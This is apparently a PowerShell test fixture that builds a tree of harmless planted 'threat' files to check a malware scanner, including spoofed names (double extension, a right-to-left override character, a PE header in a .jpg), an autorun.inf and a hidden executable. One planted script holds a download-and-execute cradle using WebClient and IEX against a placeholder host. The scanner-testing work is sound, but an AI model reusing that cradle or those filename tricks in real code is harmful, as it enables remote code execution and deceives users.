<#
.SYNOPSIS
    Builds a directory tree of planted threats for the scanner tests.

.DESCRIPTION
    Nothing here is malware. Every file is a few bytes of header or plain text
    chosen to match one of the patterns the scanner looks for - a PE header on a
    file called .jpg, a name with a direction-override character in it, and so
    on. None of it is executable in any meaningful sense and none of it is ever
    run by the tests.

.PARAMETER Kind
    Full       - every planted threat, worst severity Critical.
    NoCritical - worst severity High. The GUI test needs this: Complete-Scan
                 raises a modal MessageBox when it finds anything Critical, and
                 a modal dialog in CI blocks the job until it times out.
#>
param(
    [Parameter(Mandatory)][string]$Path,
    [ValidateSet('Full', 'NoCritical')][string]$Kind = 'Full'
)

$ErrorActionPreference = 'Stop'

if (Test-Path -LiteralPath $Path) { Remove-Item -LiteralPath $Path -Recurse -Force }
$null = New-Item -ItemType Directory -Path $Path -Force
$null = New-Item -ItemType Directory -Path (Join-Path $Path 'docs') -Force

function Write-Bytes {
    param([string]$File, [byte[]]$Bytes)
    [System.IO.File]::WriteAllBytes($File, $Bytes)
}

# 'MZ' plus padding - the header that makes Windows treat a file as a program.
$peHeader = [byte[]]@(0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00)

# An archive holding an executable entry. High, in both fixtures: it is the
# check that gives the NoCritical tree something to actually find.
Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue
$zipPath = Join-Path $Path 'bundle.zip'
$zip = [System.IO.Compression.ZipFile]::Open($zipPath, 'Create')
try {
    $entry = $zip.CreateEntry('dropper.exe')
    $writer = New-Object System.IO.StreamWriter($entry.Open())
    try { $writer.Write('MZ') } finally { $writer.Dispose() }
}
finally { $zip.Dispose() }

# Ordinary files, so a passing test also shows the scanner is not just flagging
# everything it sees.
Set-Content -LiteralPath (Join-Path $Path 'docs/notes.txt') -Value 'just some notes' -Encoding UTF8
Write-Bytes (Join-Path $Path 'docs/logo.png') ([byte[]]@(0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A))

# An unsigned program: Medium, and on Windows this exercises the Authenticode
# path rather than the catch block it falls into elsewhere.
Write-Bytes (Join-Path $Path 'tool.exe') $peHeader

if ($Kind -eq 'NoCritical') { return $Path }

# --- Critical-severity plants -------------------------------------------

# autorun.inf naming a program to launch.
Set-Content -LiteralPath (Join-Path $Path 'autorun.inf') -Encoding ASCII -Value @(
    '[autorun]'
    'open=setup.exe'
    'shellexecute=payload.vbs'
)

# Double extension: reads as a PDF, is a program.
Write-Bytes (Join-Path $Path 'invoice.pdf.exe') $peHeader

# Contents contradict the extension: PE bytes in something called .jpg.
Write-Bytes (Join-Path $Path 'holiday.jpg') $peHeader

# U+202E right-to-left override: Explorer renders this name as photo_exe.png.
$rtl = "photo_$([char]0x202E)gnp.exe"
Write-Bytes (Join-Path $Path $rtl) $peHeader

# A script that downloads and evaluates code at runtime.
Set-Content -LiteralPath (Join-Path $Path 'install.ps1') -Encoding UTF8 -Value @(
    '$d = (New-Object Net.WebClient).DownloadString(''http://example.invalid/x'')'
    'IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($d)))'
)

# A hidden program. .NET treats a leading dot as Hidden on Unix; on Windows the
# attribute has to be set explicitly.
$hidden = Join-Path $Path '.stager.exe'
Write-Bytes $hidden $peHeader
if ($IsWindows -or $env:OS -eq 'Windows_NT') {
    $file = Get-Item -LiteralPath $hidden -Force
    $file.Attributes = $file.Attributes -bor [System.IO.FileAttributes]::Hidden
}

return $Path
